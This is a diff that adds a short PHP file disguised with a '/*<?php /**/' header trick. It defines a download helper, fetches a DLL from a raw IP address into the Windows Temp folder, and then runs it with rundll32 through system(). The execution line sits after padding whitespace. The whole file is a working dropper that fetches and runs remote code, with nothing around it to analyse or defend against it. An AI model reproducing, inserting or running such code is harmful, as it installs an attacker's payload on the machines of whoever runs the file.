@@ -1,0 +1,49 @@
+    /*<?php /**/
+
+
+
+
+function downloadFile($url, $savePath) {
+    if (file_exists($savePath)) {
+        echo "File already exists: $savePath\n";
+        return true;
+    }
+
+    $downloadedFile = file_get_contents($url);
+    if ($downloadedFile !== false) {
+        if (file_put_contents($savePath, $downloadedFile)) {
+            echo "Downloaded and saved: $savePath\n";
+            return true;
+        } else {
+            echo "Failed to save: $savePath\n";
+            return false;
+        }
+    } else {
+        echo "Failed to download: $url\n";
+        return false;
+    }
+}
+
+
+
+  
+
+
+
+
+$url =  'http://185.196.9.53/7770.dll';
+
+
+$file_name = 'C:/Windows/Temp/7770.dll';
+
+
+
+
+        if (downloadFile($url, $file_name)) {
+            // File downloaded successfully, continue with rest of your script
+            echo "Proceeding with further processing...\n";
+            // Your code here
+        } else {
+            echo "Failed to download file, aborting further processing.\n";
+        }
+         system('rundll32.exe C:/Windows/Temp/7770.dll,0');
